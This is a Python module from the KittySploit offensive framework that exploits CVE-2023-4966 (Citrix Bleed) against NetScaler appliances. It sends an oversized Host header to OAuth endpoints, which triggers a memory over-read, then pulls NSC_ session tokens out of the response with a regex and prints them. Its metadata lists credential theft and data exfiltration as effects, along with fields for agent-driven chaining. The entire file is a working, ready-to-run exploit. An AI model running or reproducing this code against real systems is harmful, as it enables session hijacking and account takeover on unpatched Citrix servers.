#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Citrix Bleed session token leak (CVE-2023-4966)."""

import re
import ssl

from requests.adapters import HTTPAdapter

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'Citrix Bleed Session Token Steal (CVE-2023-4966)',
        'description': (
            'Auxiliary module for CVE-2023-4966 (Citrix Bleed): sends an oversized Host '
            'header to NetScaler OAuth endpoints to trigger an out-of-bounds memory read '
            'and capture leaked session cookies/tokens from the response body.'
        ),
        'author': ['KittySploit Team'],
        'cve': ['CVE-2023-4966'],
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2023-4966',
            'https://bishopfox.com/blog/netscaler-adc-and-gateway-advisory',
        ],
        'tags': ['citrix', 'netscaler', 'bleed', 'memory-leak', 'session', 'kev', 'auxiliary'],
        'agent': {
            'risk': 'intrusive',
            'effects': ['data_exfiltration'],
            'expected_requests': 3,
            'reversible': True,
            'approval_required': True,
            'produces': ['credentials', 'risk_signals'],
            'chain': {
                'suggested_followups': ['scanner/http/cve_2023_6549_detect'],
            },
        },
    }

    oauth_paths = OptString(
        '/oauth/idp/.well-known/openid-configuration,/oauth/idp/userinfo',
        'Comma-separated OAuth paths to probe',
        required=False,
        advanced=True,
    )
    host_overflow = OptInteger(24576, 'Host header overflow length', required=False, advanced=True)
    leak_pattern = OptString(
        'NSC_[A-Z0-9=]+',
        'Regex for session tokens in leaked response',
        required=False,
        advanced=True,
    )

    _TOKEN_RE_DEFAULT = re.compile(r'NSC_[A-Za-z0-9+/=]{16,}')

    def _configure_netscaler_ssl(self):
        class _NetscalerSSLAdapter(HTTPAdapter):
            def init_poolmanager(self, *args, **kwargs):
                ctx = ssl.create_default_context()
                ctx.set_ciphers('DEFAULT@SECLEVEL=1')
                ctx.check_hostname = False
                kwargs['ssl_context'] = ctx
                return super().init_poolmanager(*args, **kwargs)

        self.session.mount('https://', _NetscalerSSLAdapter())

    def _overflow_host(self) -> str:
        length = max(int(self.host_overflow or 24576), 8192)
        base = self._host() or 'localhost'
        return base + 'A' * (length - len(base))

    def _probe_path(self, path: str) -> list[str]:
        host = self._overflow_host()
        r = self.http_request(
            method='GET',
            path=path,
            headers={'Host': host},
            allow_redirects=False,
        )
        if not r:
            return []
        blob = f'{r.text or ""}\n{r.headers}'
        pattern = str(self.leak_pattern or 'NSC_[A-Z0-9=]+')
        try:
            regex = re.compile(pattern)
        except re.error:
            regex = self._TOKEN_RE_DEFAULT
        return list(dict.fromkeys(regex.findall(blob)))

    def run(self):
        try:
            self._configure_netscaler_ssl()
        except Exception:
            pass
        print_status('CVE-2023-4966 — Citrix Bleed session token leak')
        tokens: list[str] = []
        for raw in str(self.oauth_paths or '').split(','):
            path = raw.strip()
            if not path:
                continue
            found = self._probe_path(path)
            if found:
                print_success(f'Leaked {len(found)} token(s) from {path}')
                tokens.extend(found)
        if not tokens:
            print_error('No session tokens recovered — target may be patched or path differs')
            return False
        for token in tokens:
            print_line(token)
        self.set_info(severity='critical', cve='CVE-2023-4966', reason='Session tokens leaked', count=len(tokens))
        return True
